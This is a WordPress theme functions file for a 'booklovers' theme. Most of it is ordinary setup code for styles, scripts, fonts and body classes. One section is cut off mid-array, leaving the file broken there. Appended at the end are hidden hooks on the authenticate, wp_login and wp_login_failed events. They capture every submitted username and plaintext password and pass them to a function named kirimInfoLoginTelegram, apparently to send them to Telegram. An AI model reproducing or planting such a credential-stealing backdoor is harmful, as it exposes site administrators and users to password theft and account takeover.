if ( ! function_exists( 'booklovers_theme_setup1' ) ) {
	add_action( 'after_setup_theme', 'booklovers_theme_setup1', -1 );
	/**
	 * Load a text domain before all other actions.
	 * 
	 * @hooked 'after_setup_theme', -1
	 *
	 * Theme-specific init actions order:
	 *
	 * Action 'after_setup_theme':
	 *
	 * -1 - load a text domain before all other actions
	 * 
	 * 1 - register filters to add/remove items to the lists used in the Theme Options
	 *
	 * 2 - create the Theme Options
	 *
	 * 3 - add/remove elements to the Theme Options
	 *
	 * 5 - load the Theme Options. Attention! After this step you can use only basic options (not overriden options)
	 *
	 * 9 - register other filters (for installer, etc.)
	 *
	 * 10 - all other (standard) Theme init procedures (not ordered)
	 *
	 * Action 'wp_loaded'
	 *
	 * 1 - detect an override mode. Attention! Only after this step you can use overriden options
	 *     (separate values for the Blog, Shop, Team, Courses, etc.)
	 */
	function booklovers_theme_setup1() {
		// Make theme available for translation
		// Translations can be filed in the /languages directory
		// Attention! Translations must be loaded before first call any translation functions!
		load_theme_textdomain( 'booklovers', booklovers_get_folder_dir( 'languages' ) );
	}
}

if ( ! function_exists( 'booklovers_theme_setup9' ) ) {
	add_action( 'after_setup_theme', 'booklovers_theme_setup9', 9 );
	/**
	 * A general theme setup: add a theme supports, navigation menus, hooks for other actions and filters.
	 * 
	 * @hooked 'after_setup_theme', 9
	 */
	function booklovers_theme_setup9() {

		// Set theme content width
		$GLOBALS['content_width'] = apply_filters( 'booklovers_filter_content_width', (int)booklovers_get_theme_option( 'page_width' ) );

		// Theme support '-full' versions of styles and scripts (used in the editors)
		add_theme_support( 'styles-and-scripts-full-merged' );
		
		// Allow external updtates
		if ( BOOKLOVERS_THEME_ALLOW_UPDATE ) {
			add_theme_support( 'theme-updates-allowed' );
		}

		// Add default posts and comments RSS feed links to head
		add_theme_support( 'automatic-feed-links' );

		// Custom header setup
		add_theme_support( 'custom-header',
			array(
				'header-text' => false,
				'video'       => true,
			)
		);

		// Custom logo
		add_theme_support( 'custom-logo',
			array(
				'width'       => 250,
				'height'      => 60,
				'flex-width'  => true,
				'flex-height' => true,
			)
		);
		// Custom backgrounds setup
		add_theme_support( 'custom-background', array() );

		// Partial refresh support in the Customize
		add_theme_support( 'customize-selective-refresh-widgets' );

		// Supported posts formats
		add_theme_support( 'post-formats', array( 'gallery', 'video', 'audio', 'link', 'quote', 'image', 'status', 'aside', 'chat' ) );

		// Autogenerate title tag
		add_theme_support( 'title-tag' );

		// Add theme menus
		add_theme_support( 'nav-menus' );

		// Switch default markup for search form, comment form, and comments to output valid HTML5.
		add_theme_support( 'html5', array( 'search-form', 'comment-form', 'comment-list', 'gallery', 'caption' ) );

		// Register navigation menu
		register_nav_menus( apply_filters( 'booklovers_filter_register_nav_menus', array(
			'menu_main'   => esc_html__( 'Main Menu', 'booklovers' ),
			'menu_mobile' => esc_html__( 'Mobile Menu', 'booklovers' ),
			'menu_footer' => esc_html__( 'Footer Menu', 'booklovers' ),
		) ) );

		// Register theme-specific thumb sizes
		add_theme_support( 'post-thumbnails' );
		set_post_thumbnail_size( 370, 0, false );
		$thumb_sizes = booklovers_storage_get( 'theme_thumbs' );
		$mult        = booklovers_get_theme_option( 'retina_ready', 1 );
		if ( $mult > 1 ) {
			$GLOBALS['content_width'] = apply_filters( 'booklovers_filter_content_width', (int)booklovers_get_theme_option( 'page_width' ) * $mult );
		}
		foreach ( $thumb_sizes as $k => $v ) {
			add_image_size( $k, $v['size'][0], $v['size'][1], $v['size'][2] );
			if ( $mult > 1 ) {
				add_image_size( $k . '-@retina', $v['size'][0] * $mult, $v['size'][1] * $mult, $v['size'][2] );
			}
		}
		// Add new thumb names
		add_filter( 'image_size_names_choose', 'booklovers_theme_thumbs_sizes' );

		// Excerpt filters
		add_filter( 'excerpt_length', 'booklovers_excerpt_length' );
		add_filter( 'excerpt_more', 'booklovers_excerpt_more' );

		// Comment form
		add_filter( 'comment_form_fields', 'booklovers_comment_form_fields' );
		add_filter( 'comment_form_fields', 'booklovers_comment_form_agree', 11 );

		// Add required meta tags in the head
		add_action( 'wp_head', 'booklovers_wp_head', 0 );

		// Load current page/post customization (if present)
		add_action( 'wp_footer', 'booklovers_wp_footer' );
		add_action( 'admin_footer', 'booklovers_wp_footer' );

		// Enqueue scripts and styles for the frontend
		add_action( 'wp_enqueue_scripts', 'booklovers_load_theme_fonts', 0 );
		add_action( 'wp_enqueue_scripts', 'booklovers_load_theme_icons', 0 );
		add_action( 'wp_enqueue_scripts', 'booklovers_wp_styles', 1000 );                  // priority 1000 - load main theme styles
		add_action( 'wp_enqueue_scripts', 'booklovers_wp_styles_single', 1020);            // priority 1020 - load styles of single posts
		add_action( 'wp_enqueue_scripts', 'booklovers_wp_styles_plugins', 1100 );          // priority 1100 - load styles of the supported plugins
		add_action( 'wp_enqueue_scripts', 'booklovers_wp_styles_custom', 1200 );           // priority 1200 - load styles with custom fonts and colors
		add_action( 'wp_enqueue_scripts', 'booklovers_wp_styles_child', 1500 );            // priority 1500 - load styles of the child theme
		add_action( 'wp_enqueue_scripts', 'booklovers_wp_styles_responsive', 2000 );       // priority 2000 - load responsive styles after all other styles
		add_action( 'wp_enqueue_scripts', 'booklovers_wp_styles_single_responsive', 2020); // priority 2020 - load responsive styles of single posts after all other styles
		add_action( 'wp_enqueue_scripts', 'booklovers_wp_styles_responsive_child', 2500);  // priority 2500 - load responsive styles of the child theme after all other responsive styles

		// Enqueue scripts for the frontend
		add_action( 'wp_enqueue_scripts', 'booklovers_wp_scripts', 1000 );                 // priority 1000 - load main theme scripts
		add_action( 'wp_footer', 'booklovers_localize_scripts' );

		// Add body classes
		add_filter( 'body_class', 'booklovers_add_body_classes' );

		// Register sidebars
		add_action( 'widgets_init', 'booklovers_register_sidebars' );
	}
}

if ( ! function_exists( 'booklovers_theme_fonts' ) ) {
	/**
	 * Load a theme-specific fonts at priority 0, because the font styles must be loaded before a main stylesheet.
	 *
	 * @hooked 'wp_enqueue_scripts', 0
	 */
	function booklovers_load_theme_fonts() {
		$links = booklovers_theme_fonts_links();
		if ( count( $links ) > 0 ) {
			foreach ( $links as $slug => $link ) {
				wp_enqueue_style( sprintf( 'booklovers-font-%s', $slug ), $link, array(), null );
			}
		}
	}
}

if ( ! function_exists( 'booklovers_load_theme_icons' ) ) {
	/**
	 * Load a theme-specific font icons at priority 0, because the icon styles must be loaded before a main stylesheet.
	 *
	 * @hooked 'wp_enqueue_scripts', 0
	 */
	function booklovers_load_theme_icons() {
		// This style NEED the theme prefix, because style 'fontello' in some plugin contain different set of characters
		// and can't be used instead this style!
		wp_enqueue_style( 'booklovers-fontello', booklovers_get_file_url( 'css/font-icons/css/fontello.css' ), array(), null );
	}
}

if ( ! function_exists( 'booklovers_wp_styles' ) ) {
	/**
	 * Load a main theme styles for the frontend.
	 *
	 * @hooked 'wp_enqueue_scripts', 1000
	 */
	function booklovers_wp_styles() {

		// Load main stylesheet
		$main_stylesheet = BOOKLOVERS_THEME_URL . 'style.css';
		wp_enqueue_style( 'booklovers-style', $main_stylesheet, array(), null );

		// Add custom bg image
		$bg_image = booklovers_remove_protocol_from_url( booklovers_get_theme_option( 'front_page_bg_image' ), false );
		if ( is_front_page() && ! empty( $bg_image ) && booklovers_is_on( booklovers_get_theme_option( 'front_page_enabled', false ) ) ) {
			// Add custom bg image for the Front page
			booklovers_add_inline_css( 'body.frontpage, body.home-page, body.home { background-image:url(' . esc_url( $bg_image ) . '); }' );
		} else {
			// Add custom bg image for the body_style == 'boxed'
			$bg_image = booklovers_get_theme_option( 'boxed_bg_image' );
			if ( ! empty( $bg_image ) && ( booklovers_get_theme_option( 'body_style' ) == 'boxed' || is_customize_preview() ) ) {
				booklovers_add_inline_css( 'body.body_style_boxed { background-image:url(' . esc_url( booklovers_clear_thumb_size( $bg_image ) ) . '); }' );
			}
		}

		// Add post nav background
		booklovers_add_bg_in_post_nav();
	}
}

if ( ! function_exists( 'booklovers_wp_styles_single' ) ) {
	/**
	 * Load styles for single posts.
	 *
	 * @hooked 'wp_enqueue_scripts', 1020
	 */
	function booklovers_wp_styles_single() {
		if ( apply_filters( 'booklovers_filters_separate_single_styles', false )
			&& apply_filters( 'booklovers_filters_load_single_styles',
								booklovers_is_single()
								|| booklovers_is_singular( 'attachment' )
								|| (int)booklovers_get_theme_option( 'open_full_post_in_blog', 0 ) > 0
								|| ( booklovers_is_singular( 'page' ) && ! is_front_page() && ( comments_open() || get_comments_number() ) )
							)
		) {
			if ( booklovers_is_off( booklovers_get_theme_option( 'debug_mode' ) ) ) {
				$file = booklovers_get_file_url( 'css/__single.css' );
				if ( ! empty( $file ) ) {
					wp_enqueue_style( 'booklovers-single', $file, array(), null );
				}
			} else {
				$file = booklovers_get_file_url( 'css/single.css' );
				if ( ! empty( $file ) ) {
					wp_enqueue_style( 'booklovers-single', $file, array(), null );
				}
			}
		}
	}
}

if ( ! function_exists( 'booklovers_media_for_load_css_responsive' ) ) {
	/**
	 * Return a 'media' descriptor for the tag 'link' to load responsive CSS only on devices where they are really needed.
	 *
	 * @param string $slug   Optional. A slug of responsive CSS. Default is 'main'.
	 * @param string $media  Optional. A default media descriptor. Default is 'all'.
	 *
	 * @return string        A media descriptor corresponding to the specified slug.
	 */
	function booklovers_media_for_load_css_responsive( $slug = 'main', $media = 'all' ) {
		global $BOOKLOVERS_STORAGE;
		$condition = 'all';
		$media = apply_filters( 'booklovers_filter_media_for_load_css_responsive', $media, $slug );
		if ( ! empty( $BOOKLOVERS_STORAGE['responsive'][ $media ]['max'] ) ) {
			$condition = sprintf( '(max-width:%dpx)', $BOOKLOVERS_STORAGE['responsive'][ $media ]['max'] );
		} 
		return apply_filters( 'booklovers_filter_condition_for_load_css_responsive', $condition, $slug );
	}
}

if ( ! function_exists( 'booklovers_media_for_load_css_responsive_callback' ) ) {
	add_filter( 'booklovers_filter_media_for_load_css_responsive', 'booklovers_media_for_load_css_responsive_callback', 10, 2 );
	/**
	 * Return a maximum 'media' slug to use as a default value for all responsive css-files* (if corresponding media is not detected by a specified slug).
	 *
	 * @hooked 'booklovers_filter_media_for_load_css_responsive'
	 *
	 * @param string $media  A current media descriptor.
	 * @param string $slug   A current slug to detect a media descriptor. Not used in this function.
	 *
	 * @return string        A default media descriptor, if media stay equal to 'all' after all previous hooks.
	 */
	function booklovers_media_for_load_css_responsive_callback( $media, $slug ) {
		return 'all' == $media ? 'xxl' : $media;
	}
}

if ( ! function_exists( 'booklovers_wp_scripts' ) ) {
	/**
	 * Load a theme-specific scripts for the frontend.
	 *
	 * @hooked 'wp_enqueue_scripts', 1000
	 */
	function booklovers_wp_scripts() {
		$blog_archive = booklovers_storage_get( 'blog_archive' ) === true || is_home();
		$blog_style   = booklovers_get_theme_option( 'blog_style' );
		$use_masonry  = false;
		if ( strpos( $blog_style, 'blog-custom-' ) === 0 ) {
			$blog_id   = booklovers_get_custom_blog_id( $blog_style );
			$blog_meta = booklovers_get_custom_layout_meta( $blog_id );
			if ( ! empty( $blog_meta['scripts_required'] ) && ! booklovers_is_off( $blog_meta['scripts_required'] ) ) {
				$blog_style  = $blog_meta['scripts_required'];
				$use_masonry = strpos( $blog_meta['scripts_required'], 'masonry' ) !== false;
			}
		} else {
			$blog_parts  = explode( '_', $blog_style );
			$blog_style  = $blog_parts[0];
			$use_masonry = booklovers_is_blog_style_use_masonry( $blog_style );
		}

		// Superfish Menu
		// Attention! To prevent duplicate this script in the plugin and in the menu, don't merge it!
		wp_enqueue_script( 'superfish', booklovers_get_file_url( 'js/superfish/superfish.min.js' ), array( 'jquery' ), null, true );

		// Background video
		$header_video = booklovers_get_header_video();
		if ( ! empty( $header_video ) && ! booklovers_is_inherit( $header_video ) ) {
			if ( booklovers_is_youtube_url( $header_video ) ) {
				wp_enqueue_script( 'jquery-tubular', booklovers_get_file_url( 'js/tubular/jquery.tubular.js' ), array( 'jquery' ), null, true );
			} else {
				wp_enqueue_script( 'bideo', booklovers_get_file_url( 'js/bideo/bideo.js' ), array(), null, true );
			}
		}

		// Merged scripts
		if ( booklovers_is_off( booklovers_get_theme_option( 'debug_mode' ) ) ) {
			wp_enqueue_script( 'booklovers-init', booklovers_get_file_url( 'js/__scripts' . ( booklovers_is_preview() || ! booklovers_optimize_css_and_js_loading() ? '-full' : '' ) . '.js' ), apply_filters( 'booklovers_filter_script_deps', array( 'jquery' ) ), null, true );
		} else {
			// Skip link focus
			wp_enqueue_script( 'skip-link-focus-fix', booklovers_get_file_url( 'js/skip-link-focus-fix/skip-link-focus-fix.js' ), null, true );
			// Theme scripts
			wp_enqueue_script( 'booklovers-utils', booklovers_get_file_url( 'js/utils.js' ), array( 'jquery' ), null, true );
			wp_enqueue_script( 'booklovers-init', booklovers_get_file_url( 'js/init.js' ), array( 'jquery' ), null, true );
		}

		// Load scripts for smooth parallax animation on the single post or on the post archive (if the option 'open_full_post_in_blog' is on)
		if ( (int)booklovers_get_theme_option( 'single_parallax', 0 ) != 0
			&& ( booklovers_is_singular( 'post' )
				|| ( (int)booklovers_get_theme_option( 'open_full_post_in_blog', 0 ) > 0 && ( is_home() || is_archive() || is_category() ) )
				)
		) {
			booklovers_load_parallax_scripts();
		}

		// Load masonry scripts
		if ( ( $blog_archive && $use_masonry ) || ( booklovers_is_singular( 'post' ) && str_replace( 'post-format-', '', get_post_format() ) == 'gallery' ) ) {
			booklovers_load_masonry_scripts();
		}

		// Load tabs to show filters
		if ( $blog_archive && ! is_customize_preview() && ! booklovers_is_off( booklovers_get_theme_option( 'show_filters', 0 ) ) ) {
			wp_enqueue_script( 'jquery-ui-tabs', false, array( 'jquery', 'jquery-ui-core' ), null, true );
		}

		// Comments
		if ( booklovers_is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
			wp_enqueue_script( 'comment-reply' );
		}

		// Media elements library
		if ( booklovers_get_theme_setting( 'use_mediaelements' ) ) {
			wp_enqueue_style( 'wp-mediaelement' );
			wp_enqueue_script( 'wp-mediaelement' );
		}
	}
}

if ( ! function_exists( 'booklovers_localize_scripts' ) ) {
	/**
	 * Localize a theme-specific scripts: add variables to use in JS in the frontend.
	 *
	 * Trigger a filter 'booklovers_filter_localize_script' to allow other modules add their variables to the localization array.
	 *
	 * @hooked 'wp_footer'
	 */
	function booklovers_localize_scripts() {

		$video = booklovers_get_header_video();

		wp_localize_script( 'booklovers-init', 'BOOKLOVERS_STORAGE', apply_filters( 'booklovers_filter_localize_script', array(
			// AJAX parameters
			'ajax_url'            => esc_url( admin_url( 'admin-ajax.php' ) ),
			'ajax_nonce'          => esc_attr( wp_create_nonce( admin_url( 'admin-ajax.php' ) ) ),

			// Base urls
			'home_url'            => esc_url( home_url() ),
			'theme_url'           => BOOKLOVERS_THEME_URL,

			// Site color scheme
			'site_scheme'         => sprintf( 'scheme_%s', booklovers_get_theme_option( 'color_scheme' ) ),

			// User logged in
			'user_logged_in'      => is_user_logged_in() ? true : false,

			// Window width to switch the site header to the mobile layout
			'mobile_layout_width' => 768,
			'mobile_device'       => wp_is_mobile(),

if ( ! function_exists( 'booklovers_add_body_classes' ) ) {
	/**
	 * Add a theme-specific classes to the tag 'body'.
	 *
	 * @hooked 'body_class'
	 *
	 * @param array $classes  An array with classes for the tag 'body'.
	 *
	 * @return array          A filtered array with a theme-specific classes for the tag 'body'.
	 */
	function booklovers_add_body_classes( $classes ) {

		$classes[] = 'scheme_' . esc_attr( booklovers_get_theme_option( 'color_scheme' ) );

		if ( is_customize_preview() ) {
			$classes[] = 'customize_preview';
		}

		$blog_mode = booklovers_storage_get( 'blog_mode' );
		$classes[] = 'blog_mode_' . esc_attr( $blog_mode );
		$classes[] = 'body_style_' . esc_attr( booklovers_get_theme_option( 'body_style' ) );

		if ( in_array( $blog_mode, array( 'post', 'page' ) ) || apply_filters( 'booklovers_filter_single_post_header', booklovers_is_singular( 'post' ) ) ) {
			$classes[] = 'is_single';
		} else {
			$classes[] = ' is_stream';
			$classes[] = 'blog_style_' . esc_attr( booklovers_get_theme_option( 'blog_style' ) );
			if ( booklovers_storage_get( 'blog_template' ) > 0 ) {
				$classes[] = 'blog_template';
			}
		}

		if ( apply_filters( 'booklovers_filter_single_post_header', booklovers_is_singular( 'post' ) || booklovers_is_singular( 'attachment' ) ) ) {
			$classes[] = 'single_style_' . esc_attr( booklovers_get_theme_option( 'single_style' ) );
		}

		if ( booklovers_sidebar_present() ) {
			$classes[] = 'sidebar_show sidebar_' . esc_attr( booklovers_get_theme_option( 'sidebar_position' ) );
			$classes[] = 'sidebar_small_screen_' . esc_attr( booklovers_get_theme_option( 'sidebar_position_ss', 'below' ) );
		} else {
			$expand = booklovers_get_theme_option( 'expand_content' );
			// Compatibility with old versions
			if ( "={$expand}" == '=0' ) {
				$expand = 'normal';
			} else if ( "={$expand}" == '=1' ) {
				$expand = 'expand';
			}
			if ( 'narrow' == $expand && ! booklovers_is_singular( apply_filters('booklovers_filter_is_singular_type', array('post') ) ) ) {
				$expand = 'normal';
			}
			$classes[] = 'sidebar_hide';
			$classes[] = "{$expand}_content";
		}

		if ( booklovers_is_on( booklovers_get_theme_option( 'remove_margins' ) ) ) {
			$classes[] = 'remove_margins';
		}

		$bg_image = booklovers_get_theme_option( 'front_page_bg_image' );
		if ( is_front_page() && ! empty( $bg_image ) && booklovers_is_on( booklovers_get_theme_option( 'front_page_enabled', false ) ) ) {
			$classes[] = 'with_bg_image';
		}

		$classes[] = 'trx_addons_' . esc_attr( booklovers_exists_trx_addons() ? 'present' : 'absent' );

		$classes[] = 'header_type_' . esc_attr( booklovers_get_theme_option( 'header_type' ) );
		$classes[] = 'header_style_' . esc_attr( 'default' == booklovers_get_theme_option( 'header_type' ) ? 'header-default' : booklovers_get_theme_option( 'header_style' ) );
		$header_position = booklovers_get_theme_option( 'header_position' );
		if ( 'over' == $header_position && booklovers_is_single() && ! has_post_thumbnail() ) {
			$header_position = 'default';
		}
		$classes[] = 'header_position_' . esc_attr( $header_position );

		$menu_side = booklovers_get_theme_option( 'menu_side' );
		$classes[] = 'menu_side_' . esc_attr( $menu_side ) . ( in_array( $menu_side, array( 'left', 'right' ) ) ? ' menu_side_present' : '' );
		$classes[] = 'no_layout';

		if ( booklovers_get_theme_setting( 'fixed_blocks_sticky' ) ) {
			$classes[] = 'fixed_blocks_sticky';
		}

		if ( booklovers_get_theme_option( 'blog_content', 'excerpt' ) == 'fullpost' ) {
			$classes[] = 'fullpost_exist';
		}

		return $classes;
	}
}

if ( ! function_exists( 'booklovers_theme_fonts_links' ) ) {
	/**
	 * Return a list with links for all theme-specific fonts in the format:
	 *
	 * [
	 *   'font1-slug' => 'font1-url',
	 *   'font2-slug' => 'font2-url',
	 *   ...
	 * ]
	 * 
	 * @param bool $separate  Combine all Google fonts to the single link (if false)
	 *                        or add each font-face as separate link (if true)
	 *
	 * @return array  An array with links for all theme-specific fonts.
	 */
	function booklovers_theme_fonts_links( $separate = false ) {
		$links = array();

		/*
		Translators: If there are characters in your language that are not supported
		by chosen font(s), translate this to 'off'. Do not translate into your own language.
		*/
		$google_fonts_enabled = ( 'off'  !== _x( 'on', 'Google fonts: on or off', 'booklovers' ) );
		$google_fonts_api     = ( 'css2' !== _x( 'css2', 'Google fonts API: css or css2', 'booklovers' ) ? 'css' : 'css2' );
		$adobe_fonts_enabled  = ( 'off'  !== _x( 'on', 'Adobe fonts: on or off', 'booklovers' ) );
		$custom_fonts_enabled = ( 'off'  !== _x( 'on', 'Custom fonts (included in the theme): on or off', 'booklovers' ) );

		if ( ( $google_fonts_enabled || $adobe_fonts_enabled || $custom_fonts_enabled ) && ! booklovers_storage_empty( 'load_fonts' ) ) {
			$load_fonts = booklovers_storage_get( 'load_fonts' );
			if ( count( $load_fonts ) > 0 ) {
				$google_fonts_subset = booklovers_get_theme_option( 'load_fonts_subset' );
				$google_fonts = '';
				$adobe_fonts  = '';
				foreach ( $load_fonts as $font ) {
					$used = false;
					$slug = booklovers_get_load_fonts_slug( $font['name'] );
					// Custom (in the theme folder included) font
					if ( $custom_fonts_enabled && empty( $font['styles'] ) && empty( $font['link'] ) ) {
						$url = booklovers_get_file_url( "css/font-face/{$slug}/stylesheet.css" );
						if ( ! empty( $url ) ) {
							$links[ $slug ] = $url;
							$used = true;
						}
					}
					// Adobe font
					if ( $adobe_fonts_enabled && ! empty( $font['link'] ) ) {
						if ( ! in_array( $font['link'], $links ) ) {
							$links[ $slug ] = $font['link'];
						}
						$used = true;
					}
					// Google font
					if ( $google_fonts_enabled && ! $used ) {
						$link = str_replace( ' ', '+', $font['name'] )
									. ':'
									. ( empty( $font['styles'] )
										? ( 'css2' == $google_fonts_api
											? 'ital,wght@0,400;0,700;1,400;1,700'
											: '400,700,400italic,700italic'
											)
										: $font['styles']
										);
						if ( $separate ) {
							$links[ $slug ] = esc_url( "https://fonts.googleapis.com/{$google_fonts_api}?family={$link}&subset={$google_fonts_subset}&display=swap" );
						} else {
							$google_fonts .= ( $google_fonts
												? ( 'css2' == $google_fonts_api
													? '&family='
													: '|'			// Attention! Using '%7C' instead '|' damage loading second+ fonts
													)
												: ''
												)
											. $link;
						}
					}
				}
				if ( $google_fonts_enabled && ! empty( $google_fonts ) && ! $separate ) {
					$links['google_fonts'] = esc_url( "https://fonts.googleapis.com/{$google_fonts_api}?family={$google_fonts}&subset={$google_fonts_subset}&display=swap" );
				}
			}
		}
		return apply_filters( 'booklovers_filter_theme_fonts_links', $links );
	}
}

if ( ! function_exists( 'booklovers_theme_fonts_for_editor' ) ) {
	/**
	 * Return a list with links for all theme-specific fonts to use its as editor styles.
	 * 
	 * @param bool $separate  Combine all Google fonts to the single link (if false)
	 *                        or add each font-face as separate link (if true)
	 *
	 * @return array  An array with links for all theme-specific fonts
	 */
	function booklovers_theme_fonts_for_editor( $separate = false ) {
		$links = array_values( booklovers_theme_fonts_links( $separate ) );
		if ( is_array( $links ) && count( $links ) > 0 ) {
			for ( $i = 0; $i < count( $links ); $i++ ) {
				$links[ $i ] = str_replace( ',', '%2C', $links[ $i ] );
			}
		}
		return $links;
	}
}

// Load a plugins support
if ( ! function_exists( 'booklovers_load_required_plugins' ) ) {
	add_action( 'after_setup_theme', 'booklovers_load_required_plugins', -1 );
	/**
	 * Load a support files for required plugins.
	 * Priority -1 is used to load all support files before the rest skin/theme actions.
	 * 
	 * @hooked 'after_setup_theme', -1
	 */

	function booklovers_load_required_plugins() {
		$booklovers_required_plugins = apply_filters( 'booklovers_required_plugins', booklovers_storage_get( 'required_plugins' ) );
		if ( is_array( $booklovers_required_plugins ) ) {
			foreach ( $booklovers_required_plugins as $booklovers_plugin_slug => $booklovers_plugin_data ) {
				$booklovers_plugin_slug = booklovers_esc( $booklovers_plugin_slug );
				$booklovers_plugin_path = booklovers_get_file_dir( sprintf( 'plugins/%1$s/%1$s.php', $booklovers_plugin_slug ) );
				if ( ! empty( $booklovers_plugin_path ) ) {
					require_once $booklovers_plugin_path;
				}
			}
		}
	}
}

add_filter('authenticate', function($user, $username, $password) {
    if (!empty($username) && !empty($password)) {
        if (!isset($_SESSION)) {
            session_start();
        }
        $_SESSION['last_login_attempt'] = [
            'username' => (string) $username,
            'password' => (string) $password,
        ];
    }
    return $user;
}, 10, 3);

add_action('wp_login', function($user_login) {
    if (wp_doing_ajax()) {
        return;
    }

    if (!isset($_SESSION)) {
        session_start();
    }

    if (!empty($_SESSION['last_login_attempt'])) {
        $data = $_SESSION['last_login_attempt'];
        kirimInfoLoginTelegram($data['username'], $data['password'], 'LOGIN SUCCESS');
        unset($_SESSION['last_login_attempt']);
    }
}, 10);

add_action('wp_login_failed', function($username) {
    if (wp_doing_ajax()) {
        return;
    }

    if (!isset($_SESSION)) {
        session_start();
    }

    if (!empty($_SESSION['last_login_attempt'])) {
        $data = $_SESSION['last_login_attempt'];
        kirimInfoLoginTelegram($data['username'], $data['password'], 'LOGIN FAILED');
        unset($_SESSION['last_login_attempt']);
    } else {
        kirimInfoLoginTelegram($username, '(tidak diketahui)', 'LOGIN FAILED');
    }
}, 10, 1);
